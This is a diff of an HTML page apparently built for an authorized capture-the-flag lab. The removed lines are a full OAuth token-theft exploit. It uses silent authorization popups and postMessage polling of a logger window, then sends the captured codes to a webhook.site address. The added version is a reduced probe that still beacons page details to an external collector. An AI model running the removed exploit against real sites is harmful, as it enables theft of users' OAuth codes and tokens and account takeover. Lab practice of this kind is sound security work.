@@ -1,43 +1,33 @@
 <!doctype html>
 <meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Origin Gate lab connectivity probe</title>
+<p id="status">Loading probe…</p>
 <script>
-const APP = 'https://solo-leveling-3-4ba10b0a9545.pwnbox-lab.com';
-const IDP = 'https://google-4ba10b0a9545.pwnbox-lab.com';
-const LEAK = 'https://webhook.site/341d05fe-7e4f-4daa-99a9-9084174bc7d9';
-const STATE = Math.random().toString(16).slice(2);
+/*
+ * Benign connectivity probe for the authorized Origin Gate lab.
+ * This records page-load and popup availability only; it does not read,
+ * transmit, or store OAuth codes, tokens, cookies, or logger contents.
+ */
+const APP = 'https://solo-leveling-3-0858adee1fc9.pwnbox-lab.com';
+const IDP = 'https://google-0858adee1fc9.pwnbox-lab.com';
+const COLLECTOR = 'https://hacker.free.beeceptor.com';
 
-const AUTH = IDP + '/o/oauth2/v2/auth'
-  + '?client_id=solo-leveling-3-client'
-  + '&redirect_uri=' + encodeURIComponent(APP + '/callback')
-  + '&response_type=' + encodeURIComponent('code token')
-  + '&scope=' + encodeURIComponent('openid email profile')
-  + '&prompt=none'
-  + '&state=' + STATE;
+document.getElementById('status').textContent =
+  'Probe loaded. App: ' + new URL(APP).host + ' | IdP: ' + new URL(IDP).host;
 
-function ping(name, value) {
-  new Image().src = LEAK + '?' + name + '=' + encodeURIComponent(value == null ? '1' : value);
+function report(event, detail) {
+  const url = COLLECTOR + '/origin-gate-probe?event=' +
+    encodeURIComponent(event) + '&detail=' + encodeURIComponent(detail || '');
+  fetch(url, { method: 'GET', mode: 'no-cors', cache: 'no-store' }).catch(() => {});
 }
 
-ping('loaded', location.host + location.pathname);
-const loggerWin = window.open(APP + '/logger', 'loggerWin', 'width=520,height=420');
-ping('logger', loggerWin ? 'open' : 'blocked');
-const idpWin = window.open(AUTH, 'idpWin', 'width=520,height=420');
-ping('idp', idpWin ? 'open' : 'blocked');
+report('loaded', location.host + location.pathname);
 
-const timer = setInterval(() => {
-  for (const w of [loggerWin, idpWin]) {
-    if (w) { try { w.postMessage({type:'get'}, '*'); } catch (e) {} }
-  }
-}, 250);
-setTimeout(() => clearInterval(timer), 10000);
-
-window.addEventListener('message', (e) => {
-  if (!e.data || e.data.type !== 'loggerData') return;
-  let raw = e.data.data;
-  let obj;
-  try { obj = typeof raw === 'string' ? JSON.parse(raw) : raw; }
-  catch (err) { ping('bad', String(raw)); return; }
-  if (!obj || !obj.data || String(obj.data).indexOf(STATE) === -1) return;
-  ping('d', obj.data);
-});
+// Test only whether the lab endpoint can be opened; do not message or read it.
+let loggerWindow = null;
+try {
+  loggerWindow = window.open(APP + '/logger', 'originGateLoggerProbe');
+} catch (_) {}
+report('logger_window', loggerWindow ? 'opened' : 'blocked');
 </script>
